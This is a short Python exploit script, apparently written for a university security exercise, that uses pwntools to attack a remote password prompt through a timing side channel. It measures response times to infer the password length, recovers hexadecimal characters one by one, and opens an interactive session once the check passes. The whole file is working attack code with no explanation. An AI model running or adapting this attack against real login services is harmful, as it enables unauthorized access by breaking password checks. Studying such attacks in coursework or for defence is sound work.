#!/Library/Frameworks/Python.framework/Versions/3.8/bin/python3

import sys, time
from pwn import *

def sendReceive(pw: None):
    r.recvline()
    start_time = time.time()
    r.sendline(pw)
    line = r.recvline().decode()
    end_time = time.time()
    time_diff = end_time - start_time
    print("Password: %s%sTime difference: %s" % (pw, ' '*(20-len(pw)), time_diff))

    if "Password incorrect" not in line:
        print("\n\nDone!")
        r.interactive()
        exit(0)
    
    return(time_diff)
 
r = remote("twinpeaks.cs.ucdavis.edu",30003)
allowed_letters = '0123456789ABCDEF'
pw_length = None
pw = None
bigger_diff = 0

for i in range(1,20):
    pw = '0' * i
    time_diff = sendReceive(pw)
    if  time_diff > bigger_diff:
        bigger_diff = time_diff
        pw_length = i

print("\nPassword length: %s\n" % pw_length)

pw_got = ''
picked_letter = ''

for i in range(1,pw_length+1):
    bigger_diff = 0
    
    for letter in allowed_letters:
        pw = pw_got + letter + '0' * (pw_length - len(pw_got) - 1)
        time_diff = sendReceive(pw)
        if time_diff > bigger_diff:
            bigger_diff = time_diff
            picked_letter = letter

    pw_got += picked_letter
    print("\nPassword got so far: %s\n" % pw_got)

